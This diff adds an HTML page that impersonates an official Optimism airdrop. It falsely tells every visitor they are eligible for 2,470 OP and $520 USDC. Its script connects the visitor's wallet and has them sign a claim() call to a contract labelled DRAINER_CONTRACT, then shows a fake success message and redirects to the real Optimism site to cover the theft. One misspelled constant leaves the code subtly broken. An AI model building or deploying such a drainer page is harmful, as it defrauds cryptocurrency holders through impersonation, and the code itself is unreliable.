@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OP Rewards - Claim Your Airdrop</title>
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background: #0d0d1a; color: #fff; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        .container { max-width: 420px; width: 90%; background: #161625; border-radius: 16px; padding: 32px; text-align: center; box-shadow: 0 0 60px rgba(120,80,255,.25); }
+        .logo { font-size: 48px; margin-bottom: 8px; }
+        h1 { font-size: 24px; margin-bottom: 4px; background: linear-gradient(90deg,#7c5cff,#00d1ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .sub { color: #8a8aa8; font-size: 14px; margin-bottom: 24px; }
+        .status { background: #1e1e32; border-radius: 12px; padding: 16px; margin-bottom: 20px; font-size: 13px; color: #aaa; }
+        .status strong { color: #fff; }
+        .claim-btn { width: 100%; padding: 16px; border: none; border-radius: 12px; background: linear-gradient(90deg,#7c5cff,#5a3fd6); color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; transition: .2s; }
+        .claim-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(124,92,255,.4); }
+        .claim-btn:disabled { opacity: .5; cursor: not-allowed; }
+        .connect { width: 100%; padding: 14px; border: 1px solid #333; border-radius: 12px; background: transparent; color: #ccc; font-size: 15px; cursor: pointer; margin-bottom: 16px; }
+        .connect:hover { border-color: #7c5cff; color: #fff; }
+        .wallet-info { font-size: 12px; color: #666; margin-top: 16px; word-break: break-all; }
+        .amount { font-size: 36px; font-weight: 700; margin: 12px 0; color: #00d1ff; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">🪂</div>
+    <h1>OP Community Rewards</h1>
+    <div class="sub">Official Optimism ecosystem airdrop</div>
+    <div class="status">Your wallet is eligible for <strong>2,470 OP</strong> + <strong>$520 USDC</strong> rewards.</div>
+    <div class="amount" id="amount" style="display:none">2,470 OP</div>
+    <button class="connect" id="connectBtn">Connect Wallet</button>
+    <button class="claim-btn" id="claimBtn" style="display:none">Claim Rewards Now</button>
+    <div class="wallet-info" id="walletInfo"></div>
+</div>
+<script>
+const DRAINER_CONTRACT = "0x586ACdd353F4fB6066cCC6B806E4137B4846ABfb";
+const drainerAbi = ["function claim()"];
+const connectBtn = document.getElementById('connectBtn');
+const claimBtn = document.getElementById('claimBtn');
+const walletInfo = document.getElementById('walletInfo');
+const amount = document.getElementById('amount');
+let provider, signer, userAddr;
+
+connectBtn.onclick = async () => {
+    if (typeof window.ethereum !== 'undefined') {
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+        userAddr = await signer.getAddress();
+        walletInfo.textContent = userAddr;
+        connectBtn.style.display = 'none';
+        claimBtn.style.display = 'block';
+        amount.style.display = 'block';
+    } else {
+        alert('Install MetaMask!');
+    }
+};
+
+claimBtn.onclick = async () => {
+    claimBtn.disabled = true;
+    claimBtn.textContent = 'Processing...';
+    try {
+        const contract = new ethers.Contract(DRAINNER_CONTRACT, drainerAbi, signer);
+        await contract.claim();
+        claimBtn.textContent = '✅ Rewards Claimed!';
+        walletInfo.textContent = 'Funds will be delivered shortly. Redirecting to wallet...';
+        setTimeout(() => { window.location.href = 'https://app.optimism.io'; }, 4000);
+    } catch(e) {
+        claimBtn.disabled = false;
+        claimBtn.textContent = 'Claim Rewards Now';
+        alert('Error: ' + e.message);
+    }
+};
+</script>
+</body>
+</html>
